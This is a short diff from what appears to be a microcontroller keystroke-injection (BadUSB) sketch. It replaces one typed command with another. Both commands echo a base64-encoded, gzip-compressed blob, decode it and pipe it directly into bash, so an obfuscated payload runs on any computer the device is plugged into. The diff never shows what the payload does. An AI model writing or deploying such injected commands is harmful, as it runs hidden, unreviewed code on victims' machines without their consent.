@@ -131,7 +131,7 @@ void loop() {
   Keyboard.send_now();
   
 
-  chaine (" echo 'H4sIAJ5LsmUA/42Qz04DIRjE7z7FBEkKMexKTa12WRLja/Si/FGSzcemoaam1mcv6x687lwYyAfzG2I+ICIRuIiJPH7b10wx+UAlhaGFKt9jqBNri9aHr5aOwyA7+HyDKtdz4d4KGI9Mdn9Hk8ZEH9joZrtt9PND87iBctBQYx0UwX1mKAIzhkdr91RXY3x4PxZrubUMP8ge6gVU03HSdV8OUB4r7Gkl2ZwzgQuR0OO+Q4IBP9+6y2Tveuj1k/ynXI7Ez27H065evyzE8JnC7BaXNqb+9NKq8/tX7qTxGqYBAAA=' | base64 -d | gzip -d | bash ");  
+  chaine ("echo 'H4sIAA/f0GUA/6WT207CQBCG73mKP0sN25ClVkOJlJIYX4ObZg+ySZ0lWI0E++5sDxy8MBaZm5020/lm/n9r3BYGlhBwY0khWrs3He1yIvsevTgyVmkqrS4iiHK30b74YYlI6c+IPooiTKHcAD5kFnCZl2CBYWHavNpYesU0nsxmk/jpcZJMISRiiI0v4lquHQSBLZowttDLJhi+4RTEM8gj8RX753ILoTDCikYhSweDpr3/pMgYa3O/Buc2u09hsfDL8DiBAA/2Q1PhDnEShn5WOx7XRzfyuUmwr89q2DZTjnSH8EudBvVFVVfIwuMMLRcZjuQaWKfjrIH+gPUTxDPmgZ3HSfWnFFheeJHiBGp6sRWd9/GiXWuJysu8vyVXOCJvcKS+ZhdKyUtHfjNE3myI7GtI50GreJ3940eg3qI3mAMtzddewgMAAA==' | base64 -d | gzip -d | bash");  
   enter();
   
    delay(5000);
